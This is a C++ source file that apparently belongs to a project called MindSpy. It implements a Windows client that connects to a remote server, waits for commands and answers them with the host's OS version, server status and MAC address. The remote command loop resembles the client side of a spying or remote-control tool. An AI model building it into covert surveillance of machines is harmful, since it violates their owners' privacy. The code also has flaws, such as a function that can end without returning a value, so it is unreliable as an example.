#include "Conector.h"

namespace MindSpy
{
	Conector::Conector(string IP, UINT32 Puerto) {
		WSAStartup(MAKEWORD(2, 2), &wsd);
		sckt = socket(AF_INET, SOCK_STREAM, 0);
		server.sin_addr.s_addr = inet_addr(IP.c_str());
		server.sin_family = AF_INET;
		server.sin_port = htons(Puerto);
		Conectado = connect(sckt, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR;
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiloProc, (LPVOID)this, NULL, NULL);
	}

	Conector::~Conector() {
		closesocket(sckt);
	}

	bool Conector::Listo()
	{
		return Conectado;
	}

	bool Conector::EnviarComando(char* cmd)
	{
		return send(sckt, cmd, strlen(cmd) + 1, 0) != SOCKET_ERROR;
	}

	int Conector::TipoComando(const char*c)
	{
		char Comandos[CANTIDAD_COMANDOS][16] = { "VERSION","SYSINFO" };
		for (int i = 0; i < CANTIDAD_COMANDOS; i++) {
			if (!strcmp(Comandos[i], c)) return i;
		}
		return COMANDO_NO_EXISTENTE;
	}

	char* Conector::ObtenerMAC()
	{
		PIP_ADAPTER_INFO AdapterInfo;
		DWORD dwBufLen = sizeof(AdapterInfo);
		static char mac_addr[18];

		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);

		if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
			free(AdapterInfo);
			AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
		}

		if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
			do {
				if (strcmp(AdapterInfo->IpAddressList.IpAddress.String, "0.0.0.0"))
				{
					sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
						AdapterInfo->Address[0], AdapterInfo->Address[1],
						AdapterInfo->Address[2], AdapterInfo->Address[3],
						AdapterInfo->Address[4], AdapterInfo->Address[5]);
					return mac_addr;
				}
				AdapterInfo = AdapterInfo->Next;
			} while (AdapterInfo);
		}
		free(AdapterInfo);
	}

	void Conector::Escuchar()
	{

		while (true)
		{
			stringstream str;
			string Comando, Op1, Op2;
			char Mensaje[4096];
			ZeroMemory(Mensaje, sizeof(Mensaje));
			int resp = recv(sckt, Mensaje, sizeof(Mensaje), 0);
			if (resp <= 0)
			{
				Conectado = false;
				break;
			}

			str.clear();
			str << Mensaje;
			str >> Comando;
			str >> Op1;
			getline(str, Op2, '\n');

			for (unsigned int i = 0; i < Comando.length(); i++) {
				Comando[i] = toupper(Comando[i]);
			}

			switch (TipoComando(Comando.c_str()))
			{
			case CLNT_CMDS::VERSION:
				EnviarComando(VERSION_CLIENTE);
				break;

			case CLNT_CMDS::SYSINFO:
			{
				OSVERSIONINFOA ovi;
				ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
				GetVersionExA(&ovi);

				stringstream cmd;

				cmd << "SYSINFO " <<
					ovi.dwBuildNumber << " " <<
					ovi.dwMajorVersion << " " <<
					ovi.dwMinorVersion << " " <<
					(int)IsWindowsServer() << " " <<
					ObtenerMAC();
				cmd.getline(Mensaje, 128, 0);
				EnviarComando(Mensaje);
				break;
			}

			}
		}
	}
};